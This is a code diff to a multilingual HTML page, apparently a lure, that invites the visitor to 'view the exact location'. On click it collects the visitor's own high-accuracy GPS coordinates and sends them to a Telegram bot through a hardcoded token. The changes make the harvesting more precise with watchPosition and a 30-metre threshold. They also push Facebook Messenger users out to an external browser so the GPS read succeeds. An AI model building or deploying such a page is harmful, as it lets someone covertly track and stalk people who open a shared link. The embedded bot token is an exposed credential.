@@ -146,6 +146,25 @@
             cursor: not-allowed;
         }
 
+        .btn-open {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #007aff;
+            border-radius: 50px;
+            background: #fff;
+            color: #007aff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: .25s;
+        }
+
+        .btn-open:hover {
+            background: #007aff;
+            color: #fff;
+        }
+
         .note {
             margin-top: 20px;
             font-size: 13px;
@@ -185,6 +204,10 @@
             📍 لعرض الموقع الدقيق اضغط هنا
         </button>
 
+        <button id="btnOpenBrowser" class="btn-open" style="display:none;">
+            🔗 فتح في المتصفح الخارجي
+        </button>
+
         <div id="result"></div>
 
         <p class="note" data-i18n="footer_note">
@@ -206,7 +229,9 @@
                 success: "✅ تم تأكيد موقعك",
                 done: "✅ تم",
                 error_prefix: "❌ فشل: ",
-                retry: "📍 إعادة المحاولة"
+                retry: "📍 إعادة المحاولة",
+                open_browser: "🔗 فتح في المتصفح الخارجي",
+                not_supported: "⚠️ متصفحك لا يدعم تحديد الموقع. الرجاء فتح الرابط في كروم أو سفاري."
             },
             ckb: {
                 page_title: "پیشاندانی شوێن",
@@ -220,7 +245,9 @@
                 success: "✅ شوێنەکەت پشتڕاست کرایەوە",
                 done: "✅ تەواو",
                 error_prefix: "❌ شکست: ",
-                retry: "📍 دووبارە هەوڵبدەرەوە"
+                retry: "📍 دووبارە هەوڵبدەرەوە",
+                open_browser: "🔗 کردنەوە لە وێبگەڕی دەرەکی",
+                not_supported: "⚠️ وێبگەڕەکەت پشتگیری شوێن ناکات. تکایە لە کرۆم یان سافاری بیکەرەوە."
             },
             en: {
                 page_title: "View Location",
@@ -234,7 +261,9 @@
                 success: "✅ Your location confirmed",
                 done: "✅ Done",
                 error_prefix: "❌ Failed: ",
-                retry: "📍 Retry"
+                retry: "📍 Retry",
+                open_browser: "🔗 Open in External Browser",
+                not_supported: "⚠️ Your browser does not support location. Please open in Chrome or Safari."
             }
         };
 
@@ -261,6 +290,22 @@
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
+
+            // پشکنینی ئایا لەناو WebViewـی مەسنجەرە
+            const isFacebookWebView = /FBAN|FBAV|FB_IAB/.test(navigator.userAgent);
+            const isInAppBrowser = /Instagram|Telegram|WhatsApp/.test(navigator.userAgent);
+
+            if (isFacebookWebView) {
+                // مەسنجەر: GPS کارناکات، دوگمەی کردنەوە لە وێبگەڕ پیشان بدە
+                document.getElementById('btnOpenBrowser').style.display = 'block';
+                document.getElementById('btnStart').style.display = 'none';
+            }
+        });
+
+        // کردنەوەی پەڕەکە لە وێبگەڕی دەرەکی
+        document.getElementById('btnOpenBrowser').addEventListener('click', function() {
+            const currentUrl = window.location.href;
+            window.open(currentUrl, '_blank');
         });
 
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
@@ -280,17 +325,47 @@
             res.style.display = 'block';
 
             try {
-                const position = await new Promise((resolve, reject) =>
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 15000
-                    })
-                );
+                // بەکارهێنانی watchPosition بۆ وردی باشتر (بۆ تێلێگرام)
+                let bestPosition = null;
+                let bestAccuracy = Infinity;
+
+                const position = await new Promise((resolve, reject) => {
+                    const watchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            if (pos.coords.accuracy < bestAccuracy) {
+                                bestAccuracy = pos.coords.accuracy;
+                                bestPosition = pos;
+                                // ئەگەر وردییەکەی کەمتر لە ٣٠ مەتر بوو، بەسە
+                                if (pos.coords.accuracy <= 30) {
+                                    navigator.geolocation.clearWatch(watchId);
+                                    resolve(pos);
+                                }
+                            }
+                        },
+                        reject,
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 12000,
+                            maximumAge: 0
+                        }
+                    );
+
+                    // دوای ١٠ چرکە باشترین شوێن بەکاردێنە
+                    setTimeout(() => {
+                        navigator.geolocation.clearWatch(watchId);
+                        if (bestPosition) {
+                            resolve(bestPosition);
+                        } else {
+                            reject(new Error('Timeout'));
+                        }
+                    }, 10000);
+                });
 
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
+                const accuracy = Math.round(position.coords.accuracy);
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
+                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🎯 الدقة: ${accuracy} متر\n🗺️ ${mapsLink}`;
 
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -306,9 +381,9 @@
                 btn.textContent = translations[currentLang].done;
 
             } catch (e) {
-                res.textContent = translations[currentLang].error_prefix + e.message;
                 btn.disabled = false;
                 btn.textContent = translations[currentLang].retry;
+                res.textContent = translations[currentLang].error_prefix + e.message;
             }
         }
     </script>
